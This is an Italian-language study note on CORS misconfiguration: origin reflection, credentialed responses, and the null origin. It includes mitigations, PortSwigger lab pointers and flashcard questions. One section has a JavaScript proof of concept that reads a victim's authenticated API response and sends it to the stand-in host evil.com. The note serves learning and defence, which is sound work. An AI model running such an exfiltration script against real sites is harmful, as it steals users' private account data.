---
tipo: concetto
tag: [web, owasp]
fase: 3
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["CORS Misconfiguration"]
---

# CORS Misconfiguration

> **Nota etica**: testare solo su applicazioni di cui si ha autorizzazione.

## In breve
Il **CORS** (Cross-Origin Resource Sharing) è il meccanismo con cui un server dichiara quali origini esterne possono leggere le sue risposte via JavaScript, rilassando la **Same-Origin Policy**. Una configurazione errata permette a un sito malevolo di leggere dati sensibili (incluse risposte autenticate) della vittima. Rientra in **A05 - Security Misconfiguration** dell'[[OWASP Top 10]].

## Come funziona
Il browser invia l'header `Origin`; il server risponde con `Access-Control-Allow-Origin` (ACAO). Le configurazioni pericolose:
- **riflesso dell'Origin**: il server copia l'`Origin` ricevuto in ACAO senza validarlo → qualsiasi sito è "autorizzato";
- ACAO riflesso **+** `Access-Control-Allow-Credentials: true` → il sito attaccante può leggere risposte con cookie di sessione;
- `Access-Control-Allow-Origin: null` accettato (sfruttabile via iframe sandbox).

## Esempio pratico
Richiesta:
```http
GET /api/account HTTP/1.1
Host: vulnerabile.com
Origin: https://evil.com
Cookie: session=...
```
Risposta vulnerabile:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
Script sul sito attaccante che esfiltra i dati:
```javascript
fetch('https://vulnerabile.com/api/account', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.com/log?d=' + encodeURIComponent(d)));
```

## Mitigazione e difesa
- **Allow-list** rigorosa di origini fidate; mai riflettere l'`Origin` arbitrariamente.
- Non combinare ACAO permissivo con `Allow-Credentials: true`.
- Non usare `Access-Control-Allow-Origin: *` per endpoint autenticati.
- Trattare CORS come complemento, non sostituto, di un'autenticazione robusta.

## Lab
- [[PortSwigger Web Academy]] → categoria **CORS**. Percorso dal livello APPRENTICE:
  - *CORS vulnerability with basic origin reflection* — il server riflette l'`Origin` in ACAO con credenziali abilitate.
  - *CORS vulnerability with trusted null origin* — accetta `Origin: null` (sfruttabile via iframe sandbox).
  - *CORS vulnerability with trusted insecure protocols* (PRACTITIONER) — fiducia in sottodomini HTTP compromissibili.
- Cosa esercitare: con [[Burp Suite]] aggiungere un header `Origin: https://evil.com` e verificare se torna riflesso in `Access-Control-Allow-Origin` con `Allow-Credentials: true`; poi scrivere il PoC `fetch(..., {credentials:'include'})` che esfiltra la risposta.

## Domande
1. **D:** Che rapporto c'è tra CORS e Same-Origin Policy?  **R:** La SOP blocca di default la lettura cross-origin via JavaScript; CORS è il meccanismo con cui il server **rilassa** la SOP dichiarando quali origini possono leggere le sue risposte.
2. **D:** Perché il riflesso dell'`Origin` in ACAO è pericoloso?  **R:** Se il server copia l'`Origin` ricevuto senza validarlo, qualunque sito diventa "autorizzato"; combinato con `Allow-Credentials: true` permette al sito attaccante di leggere risposte autenticate della vittima.
3. **D:** Perché `Access-Control-Allow-Origin: *` non è utilizzabile per esfiltrare dati autenticati?  **R:** Con ACAO `*` il browser rifiuta di inviare le credenziali; per leggere risposte con cookie serve un ACAO specifico più `Allow-Credentials: true`.
4. **D:** Come si sfrutta `Access-Control-Allow-Origin: null`?  **R:** Facendo generare al browser un `Origin: null` (es. richiesta da un iframe con `sandbox`), che il server accetta come autorizzato.
5. **D:** Qual è la mitigazione principale?  **R:** Allow-list rigorosa di origini fidate, mai riflettere l'`Origin` arbitrariamente, e non combinare ACAO permissivo con `Allow-Credentials: true`.

## Collegamenti
- [[OWASP Top 10]]
- [[Cross-Site Request Forgery (CSRF)]]
- [[Autenticazione e Gestione Sessioni]]
- [[HTTP e HTTPS]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti
- PortSwigger — CORS: https://portswigger.net/web-security/cors
- MDN — Cross-Origin Resource Sharing: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- OWASP — CORS OriginHeaderScrutiny: https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
